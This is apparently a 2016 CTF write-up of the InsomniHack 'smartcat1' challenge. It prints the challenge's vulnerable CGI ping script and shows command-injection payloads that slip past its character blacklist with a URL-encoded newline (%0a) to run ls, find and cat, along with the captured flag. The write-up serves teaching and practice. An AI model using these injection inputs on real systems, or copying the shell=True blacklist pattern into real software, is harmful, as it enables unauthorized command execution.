---
layout: blog_item
title:  "InsomniHack CTF Teaser - Smartcat1 Writeup"
date:   2016-01-18 14:00:10
author: Arr0way
description: 'InsomniHack Teaser CTF 2016, smartcat1 challenge writeups.'
categories: [walkthroughs]
tags:
- burp
- 'command injection'
- CTF
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}


## Challenge Description

Exploit the web based ping command tool and capture the flag.  

![smartcat1 CTF](/img/blog/insomnihack/smartcat1.png)

## InsomniHack Smartcat1

Entering nothing or a <code>'</code> renders the error: <code>Error running ping -c 1 foo</code>. Enumeration indicated the following characters were filtered <code>$;&amp;|({`\t</code> Note, that included whitespace filtering.  

I loaded up burp and went through the ASCII table for other ways of escaping the command. It was possible to use LF <code>%0a</code> to escape the existing command and enter another such as: <code>dest=8.8.8.8%0als</code>.

Viewing the source code of <code>index.cgi</code> confirmed the character filtering.

{% highlight python %}
#!/usr/bin/env python

import cgi, subprocess, os

headers = ["mod_cassette_is_back/0.1","format-me-i-im-famous","dirbuster.will.not.help.you","solve_me_already"]

print "X-Powered-By: %s" % headers[os.getpid()%4]
print "Content-type: text/html"
print

print """
&lt;html&gt;

&lt;head&gt;&lt;title&gt;Can I haz Smart Cat ???&lt;/title&gt;&lt;/head&gt;

&lt;body&gt;

  &lt;h3&gt; Smart Cat debugging interface &lt;/h3&gt;
"""

blacklist = " $;&amp;|({`\t"
results = ""
form = cgi.FieldStorage()
dest = form.getvalue("dest", "127.0.0.1")
for badchar in blacklist:
    if badchar in dest:
        results = "Bad character %s in dest" % badchar
        break

if "%n" in dest:
    results = "Segmentation fault"

if not results:
    try:
        results = subprocess.check_output("ping -c 1 "+dest, shell=True)
    except:
        results = "Error running " + "ping -c 1 "+dest

print """

  &lt;form method="post" action="index.cgi"&gt;
    &lt;p&gt;Ping destination: &lt;input type="text" name="dest"/&gt;&lt;/p&gt;
  &lt;/form&gt;

  &lt;p&gt;Ping results:&lt;/p&gt;&lt;br/&gt;
  &lt;pre&gt;%s&lt;/pre&gt;

  &lt;img src="../img/cat.jpg"/&gt;

&lt;/body&gt;

&lt;/html&gt;
""" % cgi.escape(results)
{% endhighlight %}

## Flag

Entering <code>dest=%0afind</code> listed the current directory, revealing the path of the flag.

{% highlight bash %}
dest=8.8.8.8%0acat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
{% endhighlight %}

Flag contents:

{% highlight bash %}
INS{warm_kitty_smelly_kitty_flush_flush_flush}
{% endhighlight %}

Thanks for the CTF :)
